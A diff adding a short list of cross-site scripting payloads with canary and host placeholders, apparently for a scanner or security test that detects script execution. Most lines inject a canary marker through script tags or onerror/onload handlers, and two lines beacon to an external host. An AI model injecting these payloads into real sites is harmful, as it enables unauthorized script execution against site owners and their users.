@@ -1,0 +1,7 @@
+<script>document.body.insertAdjacentHTML('afterbegin','<div style="position:fixed;top:0;left:0;z-index:9999999;background:yellow;padding:6px">{canary}</div>')</script>
+<img src=x onerror="this.insertAdjacentHTML('afterend','<b>{canary}</b>')">
+<svg onload="document.body.insertAdjacentHTML('afterbegin','<div>{canary}</div>')"></svg>
+<svg onload="location.hash='{canary}_'+Date.now()"></svg>
+<img src=x onerror="(new Image()).src='http://{host}/exec?js='+Date.now()">
+<svg onload="fetch('http://{host}/exec?ts='+Date.now()).catch(()=>0)"></svg>
+<svg onload="window.open('about:blank#{canary}')"></svg>
